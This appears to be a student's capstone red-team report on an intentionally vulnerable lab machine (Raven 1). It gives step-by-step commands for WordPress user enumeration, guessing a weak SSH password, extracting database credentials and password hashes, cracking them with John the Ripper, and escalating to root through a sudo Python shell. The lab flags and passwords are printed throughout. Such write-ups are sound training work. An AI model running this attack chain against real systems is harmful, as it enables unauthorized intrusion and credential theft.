# Final-Project
# Read Team: Summary of Operations

### Table of Contents
- Scanning the network
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Network Scan
#### netdiscover

Scanned the network to find the Subnet using netdiscover and IP of the Target 1

`netdiscover`

Output Screenshot:

![Netdiscover scan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/netdiscover.png "Netdiscover scan results")

This scan identified the following machines and the corresponding IP addresses:

| IP | Machine |
|:-------------:|:-------------:|
| 192.168.1.1 | Hyper-V, Gateway IP |
| 192.168.1.100 | Capstone Machine |
| 192.168.1.105 | ELK server  |
| 192.168.1.110 | Target 1, Raven 1 |
| 192.168.1.115 | Target 2, Raven 2 |

### Exposed Services
Nmap scan results for each machine revealed the below services and OS details:

Command: `$ nmap -sV -v -p- 192.168.1.110`

Output Screenshot:

![Nmap scan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nmaptarget1.png "Nmap scan results")

This scan identifies the services below as potential points of entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn


The following vulnerabilities were  identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of User Privileges/Privilege Escalation

### Explotation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**



**wpscan**
- Exploit Used:
    - Enumerating WordPress site: WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
            - ``` wpscan --url http://192.168.1.110/wordpress --enumerate u ```
 ![wpscan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/wpscan.png "wpscan results")

Identified following users with wpscan:
  - Steven
  - Michael
  ![users results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/users.png "users results")

- Targeting user Michael
    - Small manual Brute Force attack to guess/finds Michael’s password
    - User password was weak and obvious
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`

![Flag 1 location](/Images/flag1-location.png "Flag 1 location")

- **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to gain Flag 1.
    - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
        - Once again traversing through directories and files as before Flag 2 was found in /var/www next to the html folder that held Flag 1.
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd ../` 
            - `cd ../`
            - `cd var/www`
            - `ls -l`
            - `cat flag2.txt`

![Flag 2 location](/Images/flag2-location.png "Flag 2 location")

![Flag 2 cat](/Images/flag2-cat.png "Flag 2 cat")

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Same exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
        - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

![Flag 3 location](/Images/flag3-location.png "Flag 3 location")

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - ![wp_users table](/Images/wpusers-table.png "wp_users table")

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls`
                - `cat flag4.txt`

![Flag 4 location](/Images/flag4-location.png "Flag 4 location")




